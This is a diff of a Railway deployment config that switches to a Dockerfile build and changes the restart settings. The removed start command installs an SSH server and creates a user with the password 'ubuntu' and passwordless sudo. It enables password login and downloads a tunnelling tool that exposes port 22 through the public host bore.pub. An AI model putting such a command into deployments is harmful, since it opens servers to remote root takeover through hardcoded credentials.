@@ -1,11 +1,12 @@
 {
   "$schema": "https://schema.railway.app/railway-schema.json",
   "build": {
-    "builder": "NIXPACKS"
+    "builder": "DOCKERFILE",
+    "dockerfilePath": "Dockerfile"
   },
   "deploy": {
-    "startCommand": "apt-get update -qq && apt-get install -y -qq openssh-server python3 curl sudo && mkdir -p /var/run/sshd && id ubuntu 2>/dev/null || (useradd -m -s /bin/bash ubuntu && echo 'ubuntu:ubuntu' | chpasswd && usermod -aG sudo ubuntu && echo 'ubuntu ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers) && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config && service ssh start && curl -sSL https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz -o /tmp/bore.tar.gz && tar -xzf /tmp/bore.tar.gz -C /usr/local/bin bore && chmod +x /usr/local/bin/bore && bore local 22 --to bore.pub > /tmp/bore.log 2>&1 & sleep 6 && cat /tmp/bore.log && python3 -m http.server 8080",
-    "restartPolicyType": "ON_FAILURE",
-    "restartPolicyMaxRetries": 3
+    "restartPolicyType": "ALWAYS",
+    "restartPolicyMaxRetries": 10,
+    "numReplicas": 1
   }
 }
